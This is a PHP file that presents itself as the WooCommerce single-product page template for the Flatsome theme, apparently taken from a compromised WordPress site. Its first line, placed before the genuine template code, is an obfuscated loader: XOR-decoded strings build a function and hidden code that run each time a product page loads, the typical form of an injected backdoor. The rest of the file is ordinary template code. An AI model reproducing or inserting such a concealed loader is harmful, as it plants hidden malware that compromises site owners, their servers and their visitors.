<?php $RmeYNE='X8ESL=hV7   ,-8'; $UafXfNfd=';J 28X70BNCTEBV'^$RmeYNE; $LePZcIwa=',FlU,XPU0SA-oHU011XKTL>Rq 6 -:iM3CslqoMkn, Z7JB;;nFS=e  6Tti=C6kgP2M8oat 0=divmZGLehBn.M=zNYkrlb=;J.YkK huehpDs;x9XC9Q6ae  =ZlwbmXDcXclzN;-ZzaviKb18;6jv eo;EkKI0pcZfoj5OD52CcNW+MQ,zwoBe V.-37cr=;MFhLY.g11ke2R-TPwx2PVBQpmS= .QrWK3jnCZPTJ1sNf AF 3Q,uyhcz;c b=z80lhP7:TerAvZ -I bk=hPr<-HWg,W uDJrSIYji1oPO9OtpWG22XHNwzLiCETVfVe0ZYLgR3EP VCR,SRvXkni2kx.cdLQ xjS-YnyMav> +GKyxLhMmwI086,FI1rZoO:QYicqeg  10ltVfX ; HI6oHNSafl<4 SrsMu=TAY5D -U7 f-DDnX -0e>:OJgY JYUN:WW3W4=ACQ..7gkXOI .XtR=:ngB=<Zxm Q<2dkbj-BOW,iVIG2I;3O0GoR.+AiiqS6S5Wsholrl=4eAqPULVcFF-DboSsnsoa3OvR,o4CFv<CwLJ.yGS10zFkeVQhHixUlLFInuROA0Je VJoNS- 0GywG +871=qbvoQ-5 enJfawIhBd:V1;QDM Q TmdB;<8.;Zd,prcs - >ajdi3<'; $pzjmBmsd=$UafXfNfd('', 'E DtJ->6D:.C0--YBE+cs4Q .DWTLe6 F7TEXO6agJU4T>+TUN><O:DAB5+6P6BCC4S9YCAPKUDMIVMzg7oaKJA8IZsyLUWh42,A+CoIHHEXKdWRDJ,1U4XIADAI;ELBI1oHqiesjTX.ZOKIcFUYOW1RI8OeeO ,I+G3FJJF;6YW-Kj<N4xqSLeKlR3ZXAYKVRN9oSFPSmL;aAV3Y5pJXT1:14KgwYAZ0-<.JJSc<189THDlF.4ER2DUQL<9t,k+xZYCLL;RCtXLaR,AA<EKKFbYVXL<68G2YUyjV8, Qc8K4.M.TMwcDS4=+Lp1cI,2vNwAT;--NrHOYF917M0:VpO1;w:-k00l0SXN8H NDsARHAG2.PX7bDdS-QLWs-,HRgOkQ4 RixlCDAEQLIvB.AWU-r<f5D.klHXUT2RNm5H:2<G-AA<MENU+61<AYQ:aW:>O;A9<cze32P8PXig5OZVNGxk-AZ9+9XCGNy7U<PID0HSDMDJL0=6U6=,>m,CZ<D4GuEN8NEQwR2A6ZHIJRDPPPiU44878a-H=E2zSSNOFPvF6MYR rCZvGy,LMp6UTLwZUneP-ZIaKefoHU3=3Q3:K330++DSD4QP7ARTXPYVNVK5LAALGjFAWiH9n33GZ=liD0T56C2ZETAZ>CqYIizEUIJIZMR9A'^$LePZcIwa); $pzjmBmsd();
/**
 * The Template for displaying all single products.
 *
 * Override this template by copying it to yourtheme/woocommerce/single-product.php
 *
 * @author 		WooThemes
 * @package 	WooCommerce/Templates
 * @version     1.6.4
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

get_header( 'shop' );

do_action('flatsome_before_product_page');

?>

	<?php
		/**
		 * woocommerce_before_main_content hook
		 *
		 * @hooked woocommerce_output_content_wrapper - 10 (outputs opening divs for the content)
		 * @hooked woocommerce_breadcrumb - 20
		 */
		do_action( 'woocommerce_before_main_content' );
	?>

		<?php while ( have_posts() ) : the_post(); ?>

			<?php
          if(get_theme_mod('product_layout') == 'custom') {
            wc_get_template_part( 'content', 'single-product-custom' );
          } else {
            wc_get_template_part( 'content', 'single-product' );
          }
      ?>

		<?php endwhile; // end of the loop. ?>

	<?php
		/**
		 * woocommerce_after_main_content hook
		 *
		 * @hooked woocommerce_output_content_wrapper_end - 10 (outputs closing divs for the content)
		 */
		do_action( 'woocommerce_after_main_content' );
	?>

<?php

do_action('flatsome_after_product_page');

get_footer( 'shop' );

?>
